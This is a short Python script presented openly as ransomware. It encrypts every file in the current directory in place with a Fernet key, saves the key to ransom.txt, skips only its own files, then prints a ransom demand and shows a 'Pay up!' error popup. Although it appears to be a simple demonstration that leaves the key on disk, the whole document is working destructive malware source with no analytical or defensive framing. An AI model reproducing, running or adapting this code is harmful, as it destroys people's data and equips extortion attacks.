#!/usr/bin/env python3

import os
import tkinter as tk
from cryptography.fernet import Fernet
from tkinter import messagebox

files = []
for file in os.listdir():
    if file == "ransomware.py" or file == "ransom.txt" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("ransom.txt","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)


print(">>> All of Your files are encrypted !!! :( send me some RANSOM to Decrypt it!<<<")   

root = tk.Tk()
root.withdraw()
messagebox.showerror("Ransomware Attack", "All of your files have been encrypted! Pay up!")    
root.destroy()




